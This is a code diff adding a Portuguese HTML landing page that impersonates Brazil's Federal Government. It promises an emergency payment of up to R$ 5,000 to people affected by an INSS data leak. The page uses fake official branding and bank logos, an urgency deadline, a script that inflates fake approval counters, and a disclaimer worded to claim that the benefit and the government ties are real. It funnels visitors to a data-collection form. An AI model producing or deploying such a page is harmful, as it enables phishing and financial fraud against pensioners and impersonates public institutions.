@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Benefício Emergencial - Governo Federal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* Reset e Estilos Gerais */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        body {
+            background-color: #f8f9fa;
+            color: #383636;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 100%;
+            padding: 0 15px;
+            margin: 0 auto;
+        }
+        
+        /* Cabeçalho */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid #eaeaea;
+            margin-bottom: 20px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .logo {
+            height: 30px;
+        }
+        
+        .badge {
+            background-color: #1351b4;
+            color: white;
+            font-size: 10px;
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-weight: 600;
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 12px;
+            color: #28a745;
+        }
+        
+        .security-badge img {
+            width: 12px;
+            height: 12px;
+        }
+        
+        /* Banner Principal */
+        .hero-banner {
+            background: linear-gradient(135deg, #4e9cff, #1c61cf);
+            color: white;
+            padding: 25px 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(19, 81, 180, 0.2);
+        }
+        
+        .hero-banner h1 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        .hero-banner p {
+            margin-bottom: 10px;
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .highlight {
+            font-weight: 700;
+            text-decoration: underline;
+        }
+        
+        /* Botão Principal */
+        .cta-button {
+            display: inline-block;
+            width: 100%;
+            background-color: white;
+            color: #1351b4;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            text-align: center;
+            text-decoration: none;
+            margin: 20px 0 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        
+        /* Seção de Prova Social */
+        .social-proof {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+        
+        .counter {
+            font-weight: 700;
+            color: #184183;
+        }
+        
+        /* Seção de Vídeo */
+        .video-section {
+            margin: 25px 0;
+        }
+        
+        .video-container {
+            position: relative;
+            margin-bottom: 10px;
+        }
+        
+        .video-thumbnail {
+            width: 100%;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        
+        .video-thumbnail img {
+            width: 100%;
+            display: block;
+        }
+        
+        .play-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(255, 255, 255, 0.8);
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        
+        .play-button img {
+            width: 20px;
+            margin-left: 3px;
+        }
+        
+        .video-caption {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        /* Seção de Benefícios */
+        .benefits-section {
+            background-color: white;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .benefits-section h2 {
+            color: #1351b4;
+            font-size: 20px;
+            margin-bottom: 14px;
+            text-align: center;
+        }
+        
+        .benefits-list {
+            list-style-position: inside;
+            padding-left: 5px;
+        }
+        
+        .benefits-list li {
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+        
+        /* Bancos Parceiros */
+        .partners-section {
+            text-align: center;
+            margin: 15px 0;
+        }
+        
+        .partners-section p {
+            margin-bottom: 10px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .partners-logos {
+            max-width: 100%;
+            height: auto;
+        }
+        
+        /* Rodapé Legal */
+        .legal-disclaimer {
+            background-color: #f1f1f1;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 30px 0;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .legal-disclaimer h3 {
+            font-size: 14px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        /* Rodapé */
+        .footer {
+            text-align: center;
+            padding: 20px 0;
+            font-size: 12px;
+            color: #999;
+            border-top: 1px solid #eee;
+        }
+        
+        .footer-logos {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            margin-top: 14px;
+        }
+        
+        .footer-logos img {
+            height: 30px;
+        }.imagem-container {
+            max-width: 600px;
+            margin: 14px auto;
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+        
+        .imagem-container img {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        
+        .descricao {
+            margin-top: 10px;
+            color: #555;
+            font-size: 14px;
+            line-height: 1.5;
+        } body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+        }
+        
+        .imagem-descricao {
+            text-align: center;
+            margin: 25px 0;
+        }
+        
+        .imagem-produto {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        
+        .texto-descricao {
+            text-align: center;
+            color: #333;
+            font-size: 14px;
+            line-height: 1.8;
+            padding: 0 20px;
+        }
+        
+        h1 {
+            text-align: center;
+            color: #2c3e50;
+            margin-bottom: 30px;
+        }
+        
+        .destaque {
+            font-weight: bold;
+            color: #2c3e50;
+        }
+    </style>
+    </style>
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo-container">
+                <img src="imagens/Gov.br.png" alt="Governo Federal" class="logo">
+                <span class="badge">OFICIAL</span>
+            </div>
+            <div class="security-badge">
+                <span>Ambiente seguro</span>
+            </div>
+        </header>
+
+        <main>
+            <!-- Seção Hero (Index) -->
+            <div class="hero-banner">
+                <h1>Governo liberou um novo benefício emergencial para quem teve dados vazados do INSS!</h1>
+                <p>Mais de <span class="counter">6,4 milhões</span> de brasileiros já consultaram e foram aprovados para receber a nova ajuda de custo.</p>
+               <span class="highlight"></span></p>
+                <a href="#consulta" class="cta-button">CONSULTAR BENEFÍCIO AGORA</a>
+                <p><small>⚠️ Atenção: O prazo para resgate é de 15 dias!</small></p>
+            </div>
+
+            <!-- Prova Social -->
+            <div class="social-proof">
+                <div>
+                    <p>🔄 <span class="counter">6.429.871</span> consultas</p>
+                    <p>✅ <span class="counter">4.215.603</span> aprovações</p>
+                </div>
+                
+            </div><div class="imagem-descricao">
+    <img src="imagens/1.jpeg" alt="Produto XYZ" class="imagem-produto">
+    <div class="texto-descricao">
+        <p>Governo Federal anunciou nesta quinta-feira, 8 de maio, medidas para fortalecer a transparência e garantir a tranquilidade de aposentados e pensionistas sobre seus benefícios.</p>
+        <ul>
+        </ul>
+    </div>
+</div>
+
+<div class="video-section" style="padding: 20px; text-align: center;">
+    <div class="video-container" style="max-width: 600px; margin: 0 auto;">
+        <video playsinline controls style="width: 100%; border-radius: 10px;" poster="imagens/202505211356.mp4">
+            <source src="imagens/202505211356.mp4" type="video/mp4">
+            Seu navegador não suporta a reprodução de vídeos.
+        </video>
+        <p style="margin-top: 10px; font-size: 0.9em; color: #555;">Assista ao vídeo e entenda como funciona</p>
+    </div>
+</div>
+
+            <!-- Seção de Benefícios -->
+            <div class="benefits-section" id="consulta">
+                <h2>🚨 Benefício Liberado: Confira se Você Está na Lista para Receber até R$ 5.000 do Governo</h2>
+                <p>Você pode estar entre os brasileiros que têm direito a um novo benefício liberado pelo Governo Federal!</p>
+                <p>O valor será <strong>creditado automaticamente na sua conta</strong> após a verificação.</p>
+                
+                <h3 style="margin: 20px 0 15px;">Como funciona o benefício?</h3>
+                <ul class="benefits-list">
+                    <li>O Governo identificou vazamentos de dados sensíveis do INSS</li>
+                    <li>Um fundo emergencial foi aberto para compensar os prejudicados</li>
+                    <li>O valor será liberado automaticamente após a verificação de dados</li>
+                    <li>O processo é 100% digital e seguro</li>
+                </ul>
+                
+                <a href="formulario.html" class="cta-button" style="margin-top: 20px;">FAZER CONSULTA GRATUITA</a>
+            </div>
+
+            <!-- Bancos Parceiros -->
+            <div class="partners-section">
+                <p>Bancos participantes do programa:</p>
+                <img src="imagens/caixa.png" alt="Bancos Parceiros" class="partners-logos">
+            </div>
+
+            <!-- Disclaimer Legal -->
+            <div class="legal-disclaimer">
+                <h3>AVISO LEGAL</h3>
+                <p>Este site é parte de um programa de beneficio promovido pelo Governo, desenvolvido para fins e de conscientização.</p>
+                <p> O benefício financeiro é realmente oferecido através desta plataforma.</p>
+                <p></p>
+                <p>Esta simulação possui associação com órgãos governamentais e instituições financeiras reais.</p>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <p>Sistema de Consulta de Benefícios - Governo Federal</p>
+            <p>Parceria com Banco Central do Brasil</p>
+            <div class="footer-logos">
+                <img src="imagens/banco_central.png" alt="Site Seguro">
+                <img src="imagens/gov.br.png" alt="Governo Federal">
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Simular contador de consultas
+        const counters = document.querySelectorAll('.counter');
+        if (counters.length > 0) {
+            setInterval(() => {
+                counters.forEach(counter => {
+                    const current = parseInt(counter.textContent.replace(/\D/g, ''));
+                    const increment = Math.floor(Math.random() * 10) + 1;
+                    counter.textContent = (current + increment).toLocaleString('pt-BR');
+                });
+            }, 3000);
+        }
+
+        // Simular clique no vídeo
+        const playButton = document.querySelector('.play-button');
+        if (playButton) {
+            playButton.addEventListener('click', () => {
+                alert('Este é um simulador educacional. Em um site real, este vídeo explicaria os detalhes do benefício.');
+            });
+        }
+    </script>
+</body>
+</html>
